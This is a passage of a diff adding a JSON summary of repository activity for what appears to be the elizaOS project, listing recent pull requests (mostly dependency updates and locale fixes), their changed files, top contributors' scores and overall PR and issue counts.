+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [futures](https://rust-lang.github.io/futures-rs) ([source](https://redirect.github.com/rust-lang/futures-rs)) | dependencies | patch | `0.3.3",
+      "files": [
+        "packages/rust/Cargo.lock"
+      ]
+    },
+    {
+      "title": "chore(deps): bump the uv group across 2 directories with 2 updates",
+      "prNumber": 6790,
+      "type": "other",
+      "body": "Bumps the uv group with 1 update in the /packages/benchmarks/OSWorld directory: [pypdf](https://github.com/py-pdf/pypdf).\nBumps the uv group with 1 update in the /packages/benchmarks/solana/solana-gym-env directory: [langchain-openai](https",
+      "files": [
+        "packages/benchmarks/OSWorld/uv.lock",
+        "packages/benchmarks/solana/solana-gym-env/pyproject.toml",
+        "packages/benchmarks/solana/solana-gym-env/uv.lock"
+      ]
+    },
+    {
+      "title": "chore(deps): update rust crate chrono to v0.4.44",
+      "prNumber": 6789,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [chrono](https://redirect.github.com/chronotope/chrono) | dependencies | patch | `0.4.42` → `0.4.44` |\n\n---\n\n> [!WARNING]\n> Some dependencies ",
+      "files": [
+        "packages/rust/Cargo.lock"
+      ]
+    },
+    {
+      "title": "chore(deps): update rust crate anyhow to v1.0.102",
+      "prNumber": 6788,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [anyhow](https://redirect.github.com/dtolnay/anyhow) | dependencies | patch | `1.0.100` → `1.0.102` |\n\n---\n\n> [!WARNING]\n> Some dependencies c",
+      "files": [
+        "packages/rust/Cargo.lock"
+      ]
+    },
+    {
+      "title": "chore(deps): update react monorepo",
+      "prNumber": 6785,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@types/react](https://redirect.github.",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency lerna to v9.0.7",
+      "prNumber": 6784,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [lerna](https://lerna.js.org) ([source]",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency error-ex to v1.3.4",
+      "prNumber": 6783,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [error-ex](https://redirect.github.com/",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency bun to v1.3.12",
+      "prNumber": 6782,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [bun](https://bun.com) ([source](https:",
+      "files": [
+        ".github/workflows/ci.yaml",
+        ".github/workflows/jsdoc-automation.yml",
+        ".github/workflows/multi-lang-tests.yaml",
+        ".github/workflows/publish-next-prerelease.yaml",
+        ".github/workflows/release.yaml"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency ai to v6.0.168",
+      "prNumber": 6781,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [ai](https://ai-sdk.dev/docs) ([source]",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency @ai-sdk/provider-utils to v4.0.23",
+      "prNumber": 6780,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@ai-sdk/provider-utils](https://ai-sdk",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency @ai-sdk/provider to v3.0.8",
+      "prNumber": 6775,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@ai-sdk/provider](https://ai-sdk.dev/d",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency @ai-sdk/openai to v3.0.53",
+      "prNumber": 6774,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@ai-sdk/openai](https://ai-sdk.dev/doc",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency pillow to v12 [security]",
+      "prNumber": 6773,
+      "type": "bugfix",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-con",
+      "files": [
+        "packages/benchmarks/OSWorld/pyproject.toml",
+        "packages/benchmarks/OSWorld/requirements.txt",
+        "packages/benchmarks/OSWorld/setup.py",
+        "packages/benchmarks/OSWorld/uv.lock"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency tqdm to ~=4.66.3 [security]",
+      "prNumber": 6772,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [tqdm](https://redirect.github.com/tqdm",
+      "files": [
+        "packages/benchmarks/OSWorld/setup.py"
+      ]
+    },
+    {
+      "title": "i18n: update remaining locales from 'on this Mac' to 'on this device'",
+      "prNumber": 6771,
+      "type": "other",
+      "body": "Follow-up from #6763 per review feedback.\n\nThis updates the remaining locale files that still had the English fallback phrase 'on this Mac' to 'on this device' for consistency with the prior change.\n\nUpdated locales:\n- es.json\n- ko.json\n- p",
+      "files": [
+        "packages/app-core/src/i18n/locales/en.json",
+        "packages/app-core/src/i18n/locales/es.json",
+        "packages/app-core/src/i18n/locales/ko.json",
+        "packages/app-core/src/i18n/locales/pt.json",
+        "packages/app-core/src/i18n/locales/tl.json",
+        "packages/app-core/src/i18n/locales/vi.json",
+        "packages/app-core/src/i18n/locales/zh-CN.json"
+      ]
+    },
+    {
+      "title": "fix: wire task synthesis end-to-end + harden runtime plugin load under bun",
+      "prNumber": 6770,
+      "type": "bugfix",
+      "body": "## Summary\nRebased and fixed version of #6761 by @NubsCarson. Fixes three end-to-end breakages:\n\n1. **ESM import for orchestrator**: switches `@elizaos/plugin-agent-orchestrator` from `createRequire()` to `await import()` — the package is E",
+      "files": [
+        "packages/agent/src/api/character-routes.ts",
+        "packages/agent/src/api/server.ts",
+        "packages/agent/src/runtime/eliza.ts",
+        "packages/agent/src/runtime/plugin-resolver.ts",
+        "packages/agent/src/runtime/subagent-output.ts",
+        "packages/agent/src/runtime/task-heartbeat.ts",
+        "packages/app-core/src/browser.ts",
+        "packages/elizaos/templates-manifest.json",
+        "packages/typescript/src/features/advanced-memory/services/memory-service.ts",
+        "plugins/plugin-computeruse/package.json",
+        "plugins/plugin-computeruse/src/__tests__/helpers.test.ts",
+        "plugins/plugin-computeruse/src/platform/windows-list.ts",
+        "plugins/plugin-computeruse/src/services/computer-use-service.ts"
+      ]
+    },
+    {
+      "title": "fix(i18n): replace \"on this Mac\" with \"on this device\" in all locales",
+      "prNumber": 6769,
+      "type": "bugfix",
+      "body": "## Summary\n- Follow-up to #6763\n- Updates `inboxview.ReplyHint` and `pluginsview.DiscordLocalUnavailable` in all remaining locale files (es, ko, pt, tl, vi, zh-CN, en) to use platform-neutral \"on this device\" copy\n\n## Why\nWindows users on n",
+      "files": [
+        "packages/app-core/src/i18n/locales/en.json",
+        "packages/app-core/src/i18n/locales/es.json",
+        "packages/app-core/src/i18n/locales/ko.json",
+        "packages/app-core/src/i18n/locales/pt.json",
+        "packages/app-core/src/i18n/locales/tl.json",
+        "packages/app-core/src/i18n/locales/vi.json",
+        "packages/app-core/src/i18n/locales/zh-CN.json"
+      ]
+    },
+    {
+      "title": "chore(deps): bump the uv group across 3 directories with 4 updates",
+      "prNumber": 6768,
+      "type": "other",
+      "body": "Bumps the uv group with 2 updates in the /packages/benchmarks/OSWorld directory: [tqdm](https://github.com/tqdm/tqdm) and [pypdf](https://github.com/py-pdf/pypdf).\nBumps the uv group with 1 update in the /packages/benchmarks/OSWorld/desktop",
+      "files": [
+        "packages/benchmarks/OSWorld/desktop_env/server/requirements.txt",
+        "packages/benchmarks/OSWorld/pyproject.toml",
+        "packages/benchmarks/OSWorld/requirements.txt",
+        "packages/benchmarks/OSWorld/uv.lock",
+        "packages/benchmarks/solana/solana-gym-env/uv.lock"
+      ]
+    },
+    {
+      "title": "fix(ui): make inbox reply hint platform-neutral",
+      "prNumber": 6763,
+      "type": "bugfix",
+      "body": "## Summary\n- change Inbox reply footer copy from \"on this Mac\" to \"on this device\"\n- update both the ChatView fallback string and the `inboxview.ReplyHint` English locale entry\n\n## Why\nOn Windows, the current copy is incorrect and confusing",
+      "files": [
+        "packages/app-core/src/components/pages/ChatView.tsx",
+        "packages/app-core/src/i18n/locales/en.json"
+      ]
+    },
+    {
+      "title": "feat(ui): rebase milady app-core/ui changes onto develop",
+      "prNumber": 6762,
+      "type": "feature",
+      "body": "Rebases the milady app-core/ui feature line onto current eliza develop.\\n\\nIncludes:\\n- current milady app-core/ui header/onboarding tree\\n- release contract fixes for electrobun packaging\\n- app-core @elizaos/ui dependency + related type f",
+      "files": [
+        ".gitmodules",
+        "packages/agent/src/api/cloud-billing-routes.ts",
+        "packages/agent/src/api/cloud-compat-routes.ts",
+        "packages/agent/src/config/env-vars.ts",
+        "packages/app-core/package.json",
+        "packages/app-core/platforms/electrobun/electrobun.config.ts",
+        "packages/app-core/platforms/electrobun/scripts/smoke-test-windows.ps1",
+        "packages/app-core/platforms/electrobun/scripts/verify-windows-installer-proof.ps1",
+        "packages/app-core/platforms/electrobun/src/native/credentials.ts",
+        "packages/app-core/scripts/docker-ci-smoke.sh",
+        "packages/app-core/scripts/electrobun-release-workflow-drift.test.ts",
+        "packages/app-core/scripts/release-check.test.ts",
+        "packages/app-core/scripts/release-check.ts",
+        "packages/app-core/scripts/run-release-contract-suite.mjs",
+        "packages/app-core/src/bridge/electrobun-rpc.ts",
+        "packages/app-core/src/bridge/electrobun-runtime.ts",
+        "packages/app-core/src/components/onboarding/CloudOnboarding.tsx",
+        "packages/app-core/src/components/onboarding/ConnectionStep.tsx",
+        "packages/app-core/src/components/onboarding/FeaturesStep.tsx",
+        "packages/app-core/src/components/onboarding/OnboardingStepNav.tsx",
+        "packages/app-core/src/components/onboarding/connection/ConnectionProviderDetailScreen.tsx",
+        "packages/app-core/src/components/onboarding/connection/ConnectionProviderGridScreen.tsx",
+        "packages/app-core/src/components/pages/ElizaCloudDashboard.tsx",
+        "packages/app-core/src/components/shared/LanguageDropdown.tsx",
+        "packages/app-core/src/components/shell/Header.tsx",
+        "packages/app-core/src/onboarding/connection-flow.ts",
+        "packages/app-core/src/onboarding/flow.ts",
+        "packages/app-core/src/platform/init.ts",
+        "packages/app-core/src/state/useCloudState.ts",
+        "packages/app-core/src/state/useOnboardingState.ts",
+        "packages/app-core/src/styles/styles.css",
+        "packages/app-core/src/utils/eliza-globals.ts",
+        "packages/app-core/src/utils/openExternalUrl.ts",
+        "packages/ui/src/components/onboarding/FeatureCard.tsx",
+        "packages/ui/src/components/onboarding/OnboardingStepNav.tsx",
+        "packages/ui/src/components/onboarding/onboarding-form-primitives.tsx",
+        "packages/ui/src/components/onboarding/onboarding-step-chrome.tsx",
+        "packages/ui/src/components/shell/Header.tsx",
+        "packages/ui/src/components/shell/ShellHeaderControls.tsx",
+        "packages/ui/src/index.ts",
+        "packages/ui/src/styles/electrobun-mac-window-drag.css",
+        "packages/ui/src/types/onboarding.ts",
+        "plugins/plugin-agent-skills",
+        "plugins/plugin-anthropic",
+        "plugins/plugin-cli",
+        "plugins/plugin-cron",
+        "plugins/plugin-discord",
+        "plugins/plugin-edge-tts",
+        "plugins/plugin-elizacloud",
+        "plugins/plugin-evm"
+      ]
+    },
+    {
+      "title": "fix(tasks): silence periodic thread polling UI flicker",
+      "prNumber": 6758,
+      "type": "bugfix",
+      "body": "## Summary\n- avoid flipping loading state during periodic thread polling in CodingAgentTasksPanel\n- keep polling silent unless a user-visible load transition is actually needed\n\n## Why\nRemoves recurring panel flicker during background refre",
+      "files": [
+        "apps/app-task-coordinator/src/CodingAgentTasksPanel.tsx"
+      ]
+    }
+  ],
+  "topContributors": [
+    {
+      "username": "lalalune",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/18633264?u=e2e906c3712c2506ebfa98df01c2cfdc50050b30&v=4",
+      "totalScore": 376.79737326020296,
+      "prScore": 375.04537326020295,
+      "issueScore": 0,
+      "reviewScore": 0,
+      "commentScore": 1.7519999999999998,
+      "summary": null
+    },
+    {
+      "username": "odilitime",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/16395496?u=c9bac48e632aae594a0d85aaf9e9c9c69b674d8b&v=4",
+      "totalScore": 185.54782620083637,
+      "prScore": 116.64782620083636,
+      "issueScore": 0,
+      "reviewScore": 68.5,
+      "commentScore": 0.4,
+      "summary": null
+    },
+    {
+      "username": "standujar",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/16385918?u=718bdcd1585be8447bdfffb8c11ce249baa7532d&v=4",
+      "totalScore": 106.8524587904682,
+      "prScore": 106.8524587904682,
+      "issueScore": 0,
+      "reviewScore": 0,
+      "commentScore": 0,
+      "summary": null
+    },
+    {
+      "username": "greptile-apps",
+      "avatarUrl": "https://avatars.githubusercontent.com/in/867647?v=4",
+      "totalScore": 103.5,
+      "prScore": 0,
+      "issueScore": 0,
+      "reviewScore": 103.5,
+      "commentScore": 0,
+      "summary": null
+    },
+    {
+      "username": "dutchiono",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/86275975?u=0d8badaa81aa47682651f87dc2d363837876de98&v=4",
+      "totalScore": 83.91265543265258,
+      "prScore": 83.57265543265258,
+      "issueScore": 0,
+      "reviewScore": 0,
+      "commentScore": 0.33999999999999997,
+      "summary": null
+    },
+    {
+      "username": "NubsCarson",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/192162056?u=d2be9082dbee60fcbad21d32bf6e662ab1af3674&v=4",
+      "totalScore": 70.75168214411222,
+      "prScore": 70.55168214411222,
+      "issueScore": 0,
+      "reviewScore": 0,
+      "commentScore": 0.2,
+      "summary": null
+    },
+    {
+      "username": "Dexploarer",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/211557447?u=21a243d61cc1f87574328ae07fc64d7d7577b53d&v=4",
+      "totalScore": 59.5437738965761,
+      "prScore": 59.5437738965761,
+      "issueScore": 0,
+      "reviewScore": 0,
+      "commentScore": 0,
+      "summary": null
+    },
+    {
+      "username": "MBrassey",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/16184941?u=87c48afc8151b232b200c707c4a3e3d216ca1b34&v=4",
+      "totalScore": 41.16472077083992,
+      "prScore": 40.82472077083992,
+      "issueScore": 0,
+      "reviewScore": 0,
+      "commentScore": 0.33999999999999997,
+      "summary": null
+    },
+    {
+      "username": "shahyashish",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/95119920?v=4",
+      "totalScore": 34.29558078094276,
+      "prScore": 34.29558078094276,
+      "issueScore": 0,
+      "reviewScore": 0,
+      "commentScore": 0,
+      "summary": null
+    },
+    {
+      "username": "RemilioNubilio",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/275382225?u=b1501ee01bb54e5b31ca64895f2a07c69f554a37&v=4",
+      "totalScore": 26.357912167657645,
+      "prScore": 26.357912167657645,
+      "issueScore": 0,
+      "reviewScore": 0,
+      "commentScore": 0,
+      "summary": null
+    },
+    {
+      "username": "jacksun911",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/275495830?v=4",
+      "totalScore": 26.292720770839917,
+      "prScore": 26.292720770839917,
+      "issueScore": 0,
+      "reviewScore": 0,
+      "commentScore": 0,
+      "summary": null
+    },
+    {
+      "username": "ColonistOne",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/271974769?u=af6b52db284d4ebb9209e436a1fb003ff9ccf2e4&v=4",
+      "totalScore": 26.070147180559943,
+      "prScore": 26.070147180559943,
+      "issueScore": 0,
+      "reviewScore": 0,
+      "commentScore": 0,
+      "summary": null
+    },
+    {
+      "username": "TJ-Frederick",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/40179660?u=cc95e6349c02ce418218a960922bdbb81ff2e741&v=4",
+      "totalScore": 24.923619631167554,
+      "prScore": 24.923619631167554,
+      "issueScore": 0,
+      "reviewScore": 0,
+      "commentScore": 0,
+      "summary": null
+    },
+    {
+      "username": "octo-patch",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/266937838?u=a3f158f9820f3869e6107980de78a21419ab6ae8&v=4",
+      "totalScore": 16.221325628245157,
+      "prScore": 16.221325628245157,
+      "issueScore": 0,
+      "reviewScore": 0,
+      "commentScore": 0,
+      "summary": null
+    },
+    {
+      "username": "BarisSozen",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/31259058?u=552303524bfd292b4ff8f3c0eeafa34dcef865e9&v=4",
+      "totalScore": 14.693147180559945,
+      "prScore": 14.693147180559945,
+      "issueScore": 0,
+      "reviewScore": 0,
+      "commentScore": 0,
+      "summary": null
+    },
+    {
+      "username": "fel123",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/33407903?v=4",
+      "totalScore": 13.976573590279973,
+      "prScore": 13.976573590279973,
+      "issueScore": 0,
+      "reviewScore": 0,
+      "commentScore": 0,
+      "summary": null
+    },
+    {
+      "username": "ai16z-demirix",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/188117230?u=424cd5b834584b3799da288712b3c4158c8032a1&v=4",
+      "totalScore": 8,
+      "prScore": 0,
+      "issueScore": 8,
+      "reviewScore": 0,
+      "commentScore": 0,
+      "summary": null
+    },
+    {
+      "username": "enigma-zeroclaw",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/264714710?v=4",
+      "totalScore": 6,
+      "prScore": 0,
+      "issueScore": 6,
+      "reviewScore": 0,
+      "commentScore": 0,
+      "summary": null
+    },
+    {
+      "username": "secret-mars",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/180074811?u=2c2c8b75b349ca0c5fc27382d235329be0da81bb&v=4",
+      "totalScore": 4,
+      "prScore": 0,
+      "issueScore": 4,
+      "reviewScore": 0,
+      "commentScore": 0,
+      "summary": null
+    },
+    {
+      "username": "douglasborthwick-crypto",
+      "avatarUrl": "https://avatars.githubusercontent.com/u/256362537?u=d2bcb713a5c90ba7d8bb079bbd0ea91041348838&v=4",
+      "totalScore": 0.33999999999999997,
+      "prScore": 0,
+      "issueScore": 0,
+      "reviewScore": 0,
+      "commentScore": 0.33999999999999997,
+      "summary": null
+    }
+  ],
+  "newPRs": 206,
+  "mergedPRs": 179,
+  "newIssues": 33,
+  "closedIssues": 134,
+  "activeContributors": 28
+}
